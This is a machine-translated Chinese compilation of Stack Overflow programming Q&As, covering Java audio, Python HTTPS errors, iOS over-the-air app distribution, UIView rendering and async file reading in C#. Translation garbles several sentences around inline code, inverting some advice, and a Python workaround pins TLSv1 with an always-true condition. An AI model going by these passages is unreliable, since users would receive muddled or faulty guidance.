.NET 调用`Dispose()`对象`IDisposable`......即，当`GC`清理托管`IDisposable`对象时，它调用`Dispose()`清理对象使用的任何非托管资源......在这种情况下，调用`Dispose()`似乎完成的主要事情是更确定性地释放非托管资源（因为 .NET 不使用引用计数器，一个无法访问的对象可能仍然存在并正在使用内存，相反，一个对象可能被释放，仍然可以访问）。

# java - 读取音频文件并使用 Java 显示波形。

> ID：13167899
> 
> 赞同：3
> 
> 时间：2012-10-31T21:45:02.850
> 
> 标签：java, audio, bytearray, waveform

谁能告诉我如何读取音频文件，将其存储在字节数组中并继续显示其波形？我的Java知识非常基础。如果有人可以将我链接到 Java 音频编程的学习材料，那就太好了。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:56:23.350

You will need to understand some basics about Pulse Code Modulation, as that is how waves are represented digitally as discrete byte/values. Most waveform formats are just some header/metadata and then a stream of pulse codes.

Here is a primer on digital sampling and pulse code modulation:

[http://www.speakingcode.com/2011/12/31/primer-on-digital-audio-and-pulse-code-modulation-pcm/](http://www.speakingcode.com/2011/12/31/primer-on-digital-audio-and-pulse-code-modulation-pcm/)

After that, it's relatively simple. Load the file, read through the meta data so you know the sampling rate, bit depth, etc. and then basically build up an array with the pcm values.. general java file reading techniques will work fine for that, such as described in the Java tutorials, many pages online, and several relevant questions on stack overflow.

[http://docs.oracle.com/javase/tutorial/essential/io/](http://docs.oracle.com/javase/tutorial/essential/io/)

Once you have your array, your values effectively represent the amplitude position of the wave at that point in time... scale those values and translate to an image - there's so many ways to do that, it's really just up to you. Some things to consider are do you care about the time axis, or just the shape of the wave form? if you only care about the shape, it's easier, cause you don't need to appropriately mark time and scale on the x axis (assuming you follow the standard of time on x axis and amplitude on y axis)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-01T15:15:27.563

您的两个问题都已在 SO 上得到解答。请参阅我对这些问题的回答：

音频和java基础：

[如何在 Java 中创建声音文件](https://stackoverflow.com/questions/13090757/how-can-i-create-a-sound-file-in-java)

绘制波形和波形概览：

[如何从我的 wav 文件中提取声音数据？](https://stackoverflow.com/questions/12879210/how-can-i-draw-sound-data-from-my-wav-file)

# python - HTTPS 请求导致在 Windows 中使用 Python 3 重置连接

> ID：13167907
> 
> 赞同：3
> 
> 时间：2012-10-31T21:45:34.883
> 
> 标签：python, windows, https, python-3.x, cygwin

当我在 cygwin 中将以下函数与 Python 3.2.3 包一起使用时，它会挂起对任何 https 主机的任何请求。它会抛出这个错误：[Errno 104] Connection reset by peer, after 60 seconds.

更新：我认为它仅限于 cygwin，但这也发生在带有 Python 3.3 的 Windows 7 64 位中。我现在就试试 3.2。使用windows命令shell时的错误是：urlopen error [WinError 10054] An existing connection was forced closed by the remote host

UPDATE2（Electric-Bugaloo）：这仅限于我尝试使用的几个站点。我对谷歌和其他主要网站进行了测试，没有任何问题。它似乎与此错误有关：

[http://bugs.python.org/issue16361](http://bugs.python.org/issue16361)

具体来说，服务器在客户端问候之后挂起。这是由于 python3.2 和 3.3 的编译版本附带的 openssl 版本。它错误地识别了服务器的 ssl 版本。现在，当打开与受影响站点的连接时，我需要代码将我的 ssl 版本自动降级为 sslv3，如下文所示：

[如何使用 urllib2 获取使用 SSLv3 加密的网页](https://stackoverflow.com/questions/8039859/how-to-use-urllib2-to-get-a-webpage-using-sslv3-encryption)

但我无法让它工作。

```
def worker(url, body=None, bt=None):
    '''This function does all the requests to wherever for data

    takes in a url, optional body utf-8 encoded please, and optional body type'''

    hdrs = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'en-us,en;q=0.5',
                   'Accept-Encoding': 'gzip,deflate',
                   'User-Agent': "My kewl Python tewl!"}
    if 'myweirdurl' in url:
        hdrs = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'en-us,en;q=0.5',
                   'Accept-Encoding': 'gzip,deflate',
                   'User-Agent': "Netscape 6.0"}

    if bt:
        hdrs['Content-Type'] = bt
    urlopen = urllib.request.urlopen
    Request = urllib.request.Request
    start_req = time.time()
    logger.debug('request start: {}'.format(datetime.now().ctime()))
    if 'password' not in url:
        logger.debug('request url: {}'.format(url))
    req = Request(url, data=body, headers=hdrs)
    try:
        if body:
            logger.debug("body: {}".format(body))
            handle = urlopen(req, data=body, timeout=298)
        else:
            handle = urlopen(req, timeout=298)
    except socket.error as se:
        logger.error(se)
        logger.error(se.errno)
        logger.error(type(se))
        if hasattr(se, 'errno') == 60: 
            logger.error("returning: Request Timed Out")
            return 'Request Timed Out'
    except URLError as ue:
        end_time = time.time()
        logger.error(ue)
        logger.error(hasattr(ue, 'code'))
        logger.error(hasattr(ue, 'errno'))
        logger.error(hasattr(ue, 'reason'))
        if hasattr(ue, 'code'):
            logger.warn('The server couldn\'t fulfill the request.')
            logger.error('Error code: {}'.format(ue.code))
            if ue.code == 404:
                return "Resource Not Found (404)"
        elif hasattr(ue, 'reason') :
            logger.warn('We failed to reach a server with {}'.format(url))
            logger.error('Reason: {}'.format(ue.reason))

            logger.error(type(ue.reason))
            logger.error(ue.reason.errno)
            if ue.reason == 'Operation timed out':
                logger.error("Arrggghh, timed out!")
            else:
                logger.error("Why U no match my reason?")
                if ue.reason.errno == 60:
                    return "Operation timed out"
        elif hasattr(ue, 'errno'):
            logger.warn(ue.reason)
            logger.error('Error code: {}'.format(ue.errno))
            if ue.errno == 60:
                return "Operation timed out"
        logger.error("req time: {}".format(end_time - start_req))
        logger.error("returning: Server Error")
        return "Server Error"
    else:
        resp_headers = dict(handle.info())
        logger.debug('Here are the headers of the page : {}'.format(resp_headers))
        logger.debug("The true URL in case of redirects {}".format(handle.geturl()))           
        try:
            ce = resp_headers['Content-Encoding']
        except KeyError as ke:
            ce = None
        else:
            logger.debug('Content-Encoding: {}'.format(ce))
        try:
            ct = resp_headers['Content-Type']
        except KeyError as ke:
            ct = None            
        else:
            logger.debug('Content-Type: {}'.format(ct))
        if ce == "gzip":
            logger.debug("Unzipping payload")
            bi = BytesIO(handle.read())
            gf = GzipFile(fileobj=bi, mode="rb")
            if "charset=utf-8" in ct.lower() or ct == 'text/html' or ct == 'text/plain':
                payload = gf.read().decode("utf-8")
            else:
                logger.debug("Unknown content type: {}".format(ct))
                sys.exit()
            return payload
        else:
            if ct is not None and "charset=utf-8" in ct.lower() or ct == 'text/html' or ct == 'text/plain':
                return handle.read().decode("utf-8")
            else:
                logger.debug("Unknown content type: {}".format(ct))
                sys.exit() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-22T23:50:07.830

我想通了，这是在 Windows 上进行这项工作所必需的代码块：

```
'''had to add this windows specific block to handle this bug in urllib2:
http://bugs.python.org/issue11220
'''
if "windows" in platform().lower():
    if 'my_wacky_url' or 'my_other_wacky_url' in url.lower():
        import ssl
        ssl_context = urllib.request.HTTPSHandler(
                                              context=ssl.SSLContext(ssl.PROTOCOL_TLSv1))
        opener = urllib.request.build_opener(ssl_context)
        urllib.request.install_opener(opener)
#end of urllib workaround 
```

我在第一次尝试之前添加了这个 blob：block，它就像一个魅力。感谢安德烈的帮助！

# ios - iOS 企业 OTA 分发无法下载应用程序

> ID：13167915
> 
> 赞同：32
> 
> 时间：2012-10-31T21:46:19.357
> 
> 标签：ios, enterprise, over-the-air

我创建了一个 iOS 应用程序并希望通过无线方式分发它。我遵循了本指南：

[http://help.apple.com/iosdeployment-apps/mac/1.1/?lang=en-us#app43ad77ea](http://help.apple.com/iosdeployment-apps/mac/1.1/?lang=en-us#app43ad77ea)

该应用程序使用企业证书签名并包含分发配置文件。

当我尝试将应用程序下载到 ipad 上（使用本指南中描述的技术）时，屏幕上会出现一个带有我的下载图标的方形图标，名称为“Waiting...”，然后一秒钟后名称更改为我的实际的应用程序名称，然后一秒钟后我再次收到错误消息：

> 无法下载应用程序
> 
> 目前无法下载“您的应用程序”。

在指南中，有三个故障排除提示：

> 如果无线应用程序分发失败并显示“无法下载”消息，请检查以下内容：
> 
> 确保应用程序已正确签名。通过使用 iPhone 配置实用程序或 Apple Configurator 将其安装在设备上进行测试，并查看是否出现任何错误。
> 
> 确保清单文件的链接正确且 Web 用户可以访问清单文件。
> 
> 确保 .ipa 文件（在清单文件中）的 URL 正确，并且 Web 用户可以访问 .ipa 文件。

我检查了所有三件事，它们都很好。

还有什么可能导致我的下载问题？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-10-29T14:39:37.050

正如*alexey 所*提到的，太多的原因可能会导致该消息。Apple 将其用作“捕获所有错误”。

您可以通过***Console***对其进行诊断。将设备连接到您的桌面并从**XCode 的 Organizer**（仅限 mac）或**[iPhone 配置实用程序](http://support.apple.com/downloads/#iphone%20configuration%20utility)**（mac 和 windows）访问它。但...

## 简直没那么简单！:-(

*控制台*可能还远远不够。有时那里*没有相关消息*。

然后，最后的手段是[遵循***清单***](https://stackoverflow.com/questions/9531121/ad-hoc-distribution-for-beta-testing-xcode-4-3)。再次从零开始。[那里](http://shinydevelopment.com/blog/over-the-air-ios-provisioning-and-distribution/) [有](https://stackoverflow.com/a/14925205/274502)很多...但是下面是我的通用且不详细*的空中分配清单，*目前。

* * *

* * *

1.  **有一个分发版本**- 这是最复杂的部分，总是在网络上完成，Apple 一直在改变步骤。通常，您需要一个*证书*、一个*标识符*和一个*配置文件*。*几乎*总是需要列出设备。我目前的选择是“ **Distribution -> In House** ”。

    ![Apple 开发人员 -> 会员中心 -> 证书、标识符和配置文件 -> 配置文件 -> 添加 (+)](../Images/57326536c3bfd751c006b5d37b859d7a.png)

    PS：如果您确实想列出设备，请确保 UDID 正确。这里报告了许多问题。

2.  **在 Project -> Build Settings 下设置配置文件**- 从 XCode 5 开始，情况发生了变化。您可以清除所有内容并将其设置在 *Code Signing -> ***Provisioning Profile**下，而不是使用*身份进行**代码*签名。身份应自动更改为“*自动*”。也不再需要从第 1 步手动下载文件并安装它们。XCode 现在管理它。

     ****![XCode 5 -> 项目导航器 -> 项目 -> 构建设置](../Images/58d53b517df5553789651d6438447630.png)**** 
*****   **存档**- 在 Xcode 5 中，不再需要“为存档而构建”。存档就行了。它应该会出现在**Organizer**上，如果它是一个大项目，则需要一些时间。这一步可能会出现很多错误，但它们几乎总是与代码编译有关，而不是与 OTA 有关。

    *   **部署**- 现在在*Organizer -> Archives*中，选择正确的存档（应该已经被选为最新的）点击“ *Distribute* ”，然后**Save for Enterprise or Ad Hoc Deployment**。现在可能要等很久了。保存文件时，有一个“*保存为企业分发*”选项。这是一个完全误导的名字。它真正做的是创建**plist**文件。如果你已经有一个，那很好。您甚至可以手动编辑它，这通常会更好。步骤 (5) 需要**plist**。这是一个很好的：

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>items</key>
        <array>
            <dict>
                <key>assets</key>
                <array>
                    <dict>
                        <key>kind</key>
                        <string>software-package</string>
                        <key>url</key>
                        <string>http://example.com/app.ipa</string>
                    </dict>
                    <dict>
                        <key>kind</key>
                        <string>full-size-image</string>
                        <key>needs-shine</key>
                        <false/>
                        <key>url</key>
                        <string>http://example.com/FullSizeImage.png</string>
                    </dict>
                    <dict>
                        <key>kind</key>
                        <string>display-image</string>
                        <key>needs-shine</key>
                        <false/>
                        <key>url</key>
                        <string>http://example.com/Icon.png</string>
                    </dict>
                </array>
                <key>metadata</key>
                <dict>
                    <key>bundle-identifier</key>
                    <string>com.example.app</string>
                    <key>kind</key>
                    <string>software</string>
                    <key>subtitle</key>
                    <string>for iOS</string>
                    <key>title</key>
                    <string>My App</string>
                </dict>
            </dict>
        </array>
    </dict>
    </plist> 
    ```

    *   **分发**- 如果您想使用 XCode 或 iPhone 配置实用程序安装它，请跳过此步骤。你完成了。这是**放在网站上的文件**。“简单地”添加一个带有**href**链接的 HTML 页面，例如：

    ```
     itms-services://?action=download-manifest&url=http://example.com/app.plist 
    ```

    不幸的是，处理 Web 服务器绝非易事。所以还要[检查服务器 mime-type](https://stackoverflow.com/questions/3728601/what-is-the-correct-mime-type-for-serving-an-iphone-ipa-file?lq=1)！如果您的服务器支持 php，我已经制作了几个 PHP 文件来处理它们。只需保持文件原样（*plist*、*html*和*ipa*）并**链接到`app.plist.php`**：

    **应用程序.plist.php**

    ```
    $file = fopen("app.plist", "r");
    while(!feof($file)){
        $line = fgets($file);
        print str_replace(".ipa", ".ipa.php", $line);
    }
    fclose($file);
    ?> 
    ```

    **应用程序.ipa.php**

    ```
    <?php
    header('Content-type: application/octet-stream');

    $file = fopen("app.ipa", "r");
    while(!feof($file)){
        $line = fgets($file);
        print $line;
    }
    fclose($file);
    ?> 
    ```

    *   **验证**- 确保资产阵列中列出的所有文件都可供下载。如果这些文件中的任何一个返回 404 或类似（包括图标），则整个安装将失败。您必须 (A) 使这些文件可用或 (B) 从 plist 中删除那些缺失的条目。下载工作不需要图标条目。

    这是一个没有图标的示例 plist：

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>items</key>
        <array>
            <dict>
                <key>assets</key>
                <array>
                    <dict>
                        <key>kind</key>
                        <string>software-package</string>
                        <key>url</key>
                        <string>http://example.com/app.ipa</string>
                    </dict>
                </array>
                <key>metadata</key>
                <dict>
                    <key>bundle-identifier</key>
                    <string>com.example.app</string>
                    <key>kind</key>
                    <string>software</string>
                    <key>subtitle</key>
                    <string>for iOS</string>
                    <key>title</key>
                    <string>My App</string>
                </dict>
            </dict>
        </array>
    </dict>
    </plist> 
    ```**** 

 ******文件示例是清单中非常重要的一部分。他们必须 100% 正确。**

# 仔细检查 plist 和 html 文件！

^(PS：我正在写这个答案，因为就我而言，这是*.plist*文件上错误链接的“简单”问题。而且，因此，很难诊断。好吧，只有做这个清单才能找到错误！它指向“another-app.ipa”而不是“app.ipa”！)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-06-20T08:38:59.193

导致此消息的原因有很多。

诊断它的最佳方法是**将设备连接到 Mac**并在**Organizer中查找该设备的****控制台**。

 **例如，就我而言，它是：

> verify_bundle_metadata：此应用程序不是为支持此设备系列而构建的

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-11-01T18:17:14.610

回答我自己的问题：

问题是其中一个缩略图没有在 manifest.plist 中设置正确的路径 - 所以不仅 ipa 需要正确的路径，还需要临时下载图标，否则安装将失败并显示上述错误消息。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-12-23T17:28:55.973

另一个可能的问题是 .plist**和**.ipa 都需要使用 HTTPS 托管，而不仅仅是常规的 HTTP。软件包字符串应如下所示：

```
<key>kind</key>
<string>software-package</string>
<key>url</key>
<string>https://example.com/app.ipa</string> 
```

愚蠢的小疏忽，但它让我绊倒了一段时间。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-11-01T09:53:33.553

在尝试将 iOS 5+ 应用程序安装到 iOS4.3.5 手机时，我们确实遇到了同样的错误消息。您是否还检查了部署/构建目标和目标架构以匹配显示该问题的设备？

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-12-19T02:21:45.137

确保大小写在所有文件中都匹配。它们往往不区分大小写。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-03-28T09:32:35.727

我在控制台中找到了。

> installcoordinationd(MobileInstallation)[99] : ****bundleID****:5:11:1:1:Updating PlaceholderMetadata for ****bundleID**** with failure 1 _LSInstallType 1, underlyingError (Error Domain=MIInstallerErrorDomain Code=13“无法验证 /private/var/installd/Library/Caches/com.apple.mobile.installd.staging/temp.IoCSM9/extracted/Payload/App.app 的代码签名：0xe8008016（可执行文件已签名无效权利。)" UserInfo={LibMISErrorNumber=-402620394, LegacyErrorString=ApplicationVerificationFailed, SourceFileLine=147, FunctionName=+[MICodeSigningVerifier _validateSignatureAndCopyInfoForURL:withOptions:error:], NSLocalizedDescription=无法验证 /private/var/installd/Library 的代码签名/Caches/com.apple.mobile.installd.staging/temp.IoCSM9/extracted/Payload/App.app：0xe8008016（可执行文件的签名无效。）}），来源 17>

这里我们应该看一下：
**无法验证 App.app
的代码签名 可执行文件的签名无效。**

就我而言，这是因为我从亚马逊下载了企业版本。但是构建它的配置文件已过期（在[开发人员控制台](https://developer.apple.com/account/ios/profile/)中找到）。

* * *

另一个目的是：

> “此时无法安装此应用程序。” UserInfo={NSLocalizedDescription=此时无法安装此应用程序，NSUnderlyingError=0x100cbd3c0 {Error Domain=MIInstallerErrorDomain Code=64 "升级的应用程序标识符授权字符串 (BBBUUUU.com.bundle.www) 与已安装应用程序的应用程序不匹配-标识符字符串 (CCCEEEE.com.bundle.www)；拒绝升级。” UserInfo={LegacyErrorString=MismatchedApplicationIdentifierEntitlement, FunctionName=-[MIInstallableBundle _validateApplicationIdentifierForNewBundleSigningInfo:error:], SourceFileLine=878, NSLocalizedDescription=升级的应用程序标识符授权字符串 (BBBUUUU.com.bundle.www) 与已安装应用程序的应用程序标识符字符串 (CCCEEEE) 不匹配.com.bundle.www); 被拒绝

在这里，我刚刚删除了以前版本的应用程序。错误是，因为我更改了捆绑 ID 的团队，并且它安装了具有先前捆绑 ID 的应用程序。

* * *

### 打开控制台：

*   `Xcode`> `Window`>`Devices`
*   选择设备
*   展开一个控制台，在左下角带有一个带有箭头的框。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-10-10T13:11:51.353

就我而言，问题出在我的设备上，同一应用程序的旧版本安装了相同的捆绑标识符（从 applstore 下载），所以现在当我尝试通过企业分发下载其新版本时，它什么也没做，根本没有错误。从设备中删除现有版本解决了我的问题。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-09-27T12:01:53.207

尝试签`bundle identifier`入您的`XCode`和`.plist`文件

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-12-29T12:43:32.937

就我而言，FTP 文件夹和其中的文件（清单、ipa、图像）的文件权限不正确存在问题。检查他们是否有 775 (rwx) 并且所有者/组是您的所有者。

设备控制台中的错误类似于“**无法连接到 iTunes Store** ”或“ **bundleID 的插图失败**”或“**无法加载 bundleID 的占位符插图**”。但这只是关于文件。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-03-03T18:24:55.880

就我而言，在提供 ipa 共享链接后，我做了以下操作以摆脱“无法连接到 dl.dropboxusercontent”消息。1\. 从 plist 中删除 md5 部分 2\. 上传 512*512 和 57*57 图像到 drop box，并在 plist 中的 fill_size_image 和 display_image 中提供共享链接。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-02-13T23:41:00.253

首先要检查的是您正在安装的设备是否具有您正在安装的应用程序的正确操作系统。例如，如果该应用程序是为 iOS 11 构建的，并且您的设备上装有 iOS 10，则该应用程序将安装，但您会看到此错误“无法下载应用程序”。******

# ios - 以完全保真度渲染 UIView 以进行保存

> ID：13167922
> 
> 赞同：1
> 
> 时间：2012-10-31T21:47:17.907
> 
> 标签：ios, graphics, uiview, rendering

我的应用程序允许用户在背景图像上合成图像（添加然后旋转、缩放、移动）并将最终编辑保存到相机胶卷。

主要编辑 ViewController 的视图是 UIView 层次结构的顶部。在此视图中，我将 UIImageView 添加为子视图，其中包含来自相机胶卷或相机的图像。用户然后添加额外的字符（狗、猫等），每个都实现为一个单独的 UIView，可以旋转、移动和缩放。

当用户完成编辑后，我想以可用的最高分辨率将整个场景保存到相机胶卷 - iphone4 上背景图像 1936X2592 像素（UIImageView）的分辨率。

目前我使用下面的代码，但是这只给了我场景的显示分辨率，而不是内存中图像的完整分辨率。有什么建议么？（我尝试在下面的代码中将上下文大小增加到完整的背景大小，但没有运气）

```
// create a CG context
UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, [UIScreen mainScreen].scale);

// render into the new context
[view.layer renderInContext:UIGraphicsGetCurrentContext()];

// get the image out of the context
UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T20:41:53.690

答案似乎很简单，并且在此线程中也进行了解释[https://stackoverflow.com/a/11177322/207616](https://stackoverflow.com/a/11177322/207616)

在调用 renderInContext 之前简单地放大绘图上下文以实现所需的输出图像大小

```
CGContextScaleCTM(context, scaleFactor, scaleFactor); 
```

# android - Android上的phonegap线路中断警报

> ID：13167928
> 
> 赞同：4
> 
> 时间：2012-10-31T21:47:50.427
> 
> 标签：android, iphone, cordova, jquery-mobile

我有 navigator.notification.alert("some text with phone number: 0-123-456-789") 消息用于 android。问题是电话号码被分成两行，看起来像这样：

```
some text with phone
number: 0-123-456-
789 
```

我想要一个电话号码不被破坏。电话号码足够短，可以显示在一行中。需要看起来像这样：

```
some text with phone
number:
0-123-456-789 
```

例如 0123456789 将打印在一行中，其中没有换行符。

那么如何在 Android 的电话号码之前添加换行符。\n 不起作用。它显示为警报消息中的文本或 \n 之前的文本显示为一行，这就是隐藏其后部的原因。

1）那么问题是如何在电话号码前换行？

2）或者如何不打破电话号码的线路。

在 iPhone \n 上工作正常。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-08-11T22:11:07.000

```
\n\r 
```

在 Android 上为我工作

```
navigator.notification.confirm('This will \n\r break', null, 'Title'); 
```

# ios - ViewController 已有委托时如何设置委托？

> ID：13167932
> 
> 赞同：2
> 
> 时间：2012-10-31T21:48:00.683
> 
> 标签：ios, uiviewcontroller, uialertview

我有一个发送电子邮件的 iPhone 应用程序。如果未设置“收件人：”地址，我将显示警报 (UIAlertView)。目前，我不检查用户是否点击 OK，我只是继续我的快乐方式！:D

在警报上点击确定时出现以下错误：

> wait_fences：未能收到回复：10004003

我相信这是因为我没有处理 OK 的点击，并且当应用程序正在执行其他操作时它仍然显示。因此，在对 SO 和 Google 进行了一些研究之后，看来我必须拥有这个：

```
- (void) Alert: (NSString *) title andData: (NSString *) errorMsg  {

    UIAlertView *alert = [[UIAlertView alloc]
                          initWithTitle: title
                          message: errorMsg 
                          delegate:nil
                          cancelButtonTitle: @"OK"
                          otherButtonTitles: nil];
    [alert show];

    return;

}

- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex
{
    NSLog(@"button was pressed");
} 
```

我的问题是我不知道如何为此设置委托。我已经有一个代表：

```
@interface ReportViewController : UIViewController <UIWebViewDelegate>  { 
```

如何设置委托以便处理 OK 按钮的点击，从而消除错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:52:56.413

在尖括号内，您可以提供以逗号分隔的协议列表。

```
@interface ReportViewController : UIViewController <UIWebViewDelegate, UIAlertViewDelegate>  { 
```

现在您可以实现两组方法。并且不要忘记将警报视图的委托设置为`self`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T23:40:33.617

根据您在问题中的代码，您的代表看起来像 nil `'delegate:nil'`。您需要将其更改为`'delegate:self'`.

# c# - 如何异步 Files.ReadAllLines 并等待结果？

> ID：13167934
> 
> 赞同：80
> 
> 时间：2012-10-31T21:48:03.117
> 
> 标签：c#, .net, asynchronous, async-await, c#-5.0

我有以下代码，

```
 private void button1_Click(object sender, RoutedEventArgs e)
    {
        button1.IsEnabled = false;

        var s = File.ReadAllLines("Words.txt").ToList(); // my WPF app hangs here
        // do something with s

        button1.IsEnabled = true;
    } 
```

`Words.txt`有很多单词我读入了 s 变量，我试图在 C# 5 中使用`async`和`await`关键字，`Async CTP Library`这样 WPF 应用程序就不会挂起。到目前为止，我有以下代码，

```
 private async void button1_Click(object sender, RoutedEventArgs e)
    {
        button1.IsEnabled = false;

        Task<string[]> ws = Task.Factory.FromAsync<string[]>(
            // What do i have here? there are so many overloads
            ); // is this the right way to do?

        var s = await File.ReadAllLines("Words.txt").ToList();  // what more do i do here apart from having the await keyword?
        // do something with s

        button1.IsEnabled = true;
    } 
```

目标是以异步而不是同步的方式读取文件，以避免 WPF 应用程序冻结。

任何帮助表示赞赏，谢谢！

* * *

## 回答 #1

> 赞同：152
> 
> 时间：2012-10-31T21:54:42.567

**更新**[`File.ReadAll[Lines|Bytes|Text]`](https://github.com/dotnet/corefx/blob/41a2120b233cc02c175f812e4e19e3f058396cb0/src/System.IO.FileSystem/src/System/IO/File.cs#L620-L944)：`File.AppendAll[Lines|Text]`和的异步版本`File.WriteAll[Lines|Bytes|Text]`现已[合并到 .NET Core](https://github.com/dotnet/corefx/pull/15372)并随 .NET Core 2.0 一起提供。它们也包含在 .NET Standard 2.1 中。

使用`Task.Run`，它本质上是一个包装器`Task.Factory.StartNew`，因为异步包装器[是一种代码味道](http://blog.stephencleary.com/2013/11/taskrun-etiquette-examples-dont-use.html)。

如果你不想使用阻塞函数浪费 CPU 线程，你应该等待一个真正的异步 IO 方法[`StreamReader.ReadToEndAsync`](http://msdn.microsoft.com/en-us/library/system.io.streamreader.readtoendasync.aspx)，像这样：

```
using (var reader = File.OpenText("Words.txt"))
{
    var fileText = await reader.ReadToEndAsync();
    // Do something with fileText...
} 
```

这会将整个文件作为 a`string`而不是`List<string>`. 如果您需要换行，则可以在之后轻松拆分字符串，如下所示：

```
using (var reader = File.OpenText("Words.txt"))
{
    var fileText = await reader.ReadToEndAsync();
    return fileText.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
} 
```

**编辑**：这里有一些方法可以实现与 相同的代码`File.ReadAllLines`，但以真正异步的方式。代码基于[`File.ReadAllLines`](http://referencesource.microsoft.com/#mscorlib/system/io/file.cs,8d10107b7a92c5c2)自身的实现：

```
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading.Tasks;

public static class FileEx
{
    /// <summary>
    /// This is the same default buffer size as
    /// <see cref="StreamReader"/> and <see cref="FileStream"/>.
    /// </summary>
    private const int DefaultBufferSize = 4096;

    /// <summary>
    /// Indicates that
    /// 1\. The file is to be used for asynchronous reading.
    /// 2\. The file is to be accessed sequentially from beginning to end.
    /// </summary>
    private const FileOptions DefaultOptions = FileOptions.Asynchronous | FileOptions.SequentialScan;

    public static Task<string[]> ReadAllLinesAsync(string path)
    {
        return ReadAllLinesAsync(path, Encoding.UTF8);
    }

    public static async Task<string[]> ReadAllLinesAsync(string path, Encoding encoding)
    {
        var lines = new List<string>();

        // Open the FileStream with the same FileMode, FileAccess
        // and FileShare as a call to File.OpenText would've done.
        using (var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, DefaultBufferSize, DefaultOptions))
        using (var reader = new StreamReader(stream, encoding))
        {
            string line;
            while ((line = await reader.ReadLineAsync()) != null)
            {
                lines.Add(line);
            }
        }

        return lines.ToArray();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-09-13T11:07:06.317

以下是我为 a 创建的辅助方法`NetStandart 2.0 class library`，它们在`NetCore 3.1`和`NetFramework 4.7.2`项目中都使用过。

这些实现与net core 3.1 / net standard 2.1类方法的名称和签名完全匹配`File`，因此您只需将它们放在任何公共类中即可。（例如 FileHelper...）：

此外，这应该是最有效的，并且类似于 .net 实现的源代码。

```
 private const int DefaultBufferSize = 4096;
    // File accessed asynchronous reading and sequentially from beginning to end.
    private const FileOptions DefaultOptions = FileOptions.Asynchronous | FileOptions.SequentialScan;

    public static async Task WriteAllTextAsync(string filePath, string text)
    {
        byte[] encodedText = Encoding.Unicode.GetBytes(text);

        using FileStream sourceStream = new FileStream(filePath, FileMode.Append, FileAccess.Write, FileShare.None,
            DefaultBufferSize, true);
        await sourceStream.WriteAsync(encodedText, 0, encodedText.Length);
    }

    public static async Task<IEnumerable<string>> ReadAllLinesAsync(string filePath)
    {
        var lines = new List<string>();

        using var sourceStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read,
            DefaultBufferSize, DefaultOptions);
        using var reader = new StreamReader(sourceStream, Encoding.Unicode);
        string line;
        while ((line = await reader.ReadLineAsync()) != null) lines.Add(line);

        return lines;
    }

    public static async Task<string> ReadAllTextAsync(string filePath)
    {
        using var sourceStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read,
            DefaultBufferSize, DefaultOptions);
        using var reader = new StreamReader(sourceStream, Encoding.Unicode);
        return await reader.ReadToEndAsync();
    } 
```

# **编辑**

显然，StreamReader“异步”方法在返回不完整的任务之前会阻塞当前线程相当长的时间。

（即使目前的 netcore 3.1`File.ReadAllLinesAsyn,File.ReadAllTextAsync`似乎也不是完全异步的。您可以查看源代码，它们基于 StreamReader“异步”方法）。

所以，我正在分享一个似乎是目前最有效的方式的实现。\

它比在 中运行同步方法之类的选项要好，因为用它来包装**同步**代码并期望这是完整的**异步**流程是`Task.Run(()=>File.ReadAllLines(...))`一种非常糟糕的做法。\ 实际上，它打破了真正异步dotnet结构的内部队列机制。**`Task.Run`**

 ****```
public static async Task<string> ReadAllTextAsync(string filePath)
    {
        using (var sourceStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read,
            DefaultBufferSize, DefaultOptions))
        {
            var sb = new StringBuilder();
            var buffer = new byte[0x1000];
            var numRead = 0;

            while ((numRead = await sourceStream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                sb.Append(Encoding.Unicode.GetString(buffer, 0, numRead));
            return sb.ToString();
        }
    } 
```

## 测试时间

这是我的测试及其输出，清楚地显示实际运行**是**异步的：

```
 var stopwatch = Stopwatch.StartNew();
        var fileTask = FileHelper.ReadAllTextAsync("48MB_file.txt");
        var duration1 = stopwatch.ElapsedMilliseconds;
        var isCompleted = fileTask.IsCompleted;

        stopwatch.Restart();
        await fileTask;
        var duration2 = stopwatch.ElapsedMilliseconds;

